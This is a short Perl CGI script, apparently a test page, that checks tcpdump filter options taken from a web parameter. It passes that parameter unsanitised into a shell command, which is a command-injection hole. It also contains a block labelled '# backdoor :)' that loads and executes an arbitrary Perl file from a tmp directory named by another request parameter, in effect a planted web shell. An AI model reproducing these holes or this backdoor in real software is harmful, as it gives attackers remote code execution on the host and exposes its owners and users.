#!/usr/bin/env perl
use lib '/usr/local/var/www/cgi-bin/web_perl/';
use strict;

use CGI ();
use DSSafe;


sub tcpdump_options_syntax_check {
    my $options = shift;
    # timeout -s 9 2 
    print "/usr/sbin/tcpdump -d $options >/dev/null 2>&1<br>\n";
    return $options if system("/usr/sbin/tcpdump -d $options >/dev/null 2>&1") == 0;
    # return $options if system("/usr/bin/tcpdump -d $options ") == 0;
    return undef;
}
 
print "Content-type: text/html\n\n";
print "test<br>\n";
 
my $options = CGI::param("options");
my $output = tcpdump_options_syntax_check($options);

print "<br>\n";
print "options: $options";
print "<br>\n";
print "output: $output";
print "<br>\n";
 

# backdoor :)
my $tpl = CGI::param("tpl");
if (length $tpl > 0 && index($tpl, "..") == -1) {
    $tpl = "./tmp/" . $tpl . ".thtml";
    print "$tpl";
    print "<br>\n";
    print "<br>\n";
    print "<br>\n";
    require($tpl);
}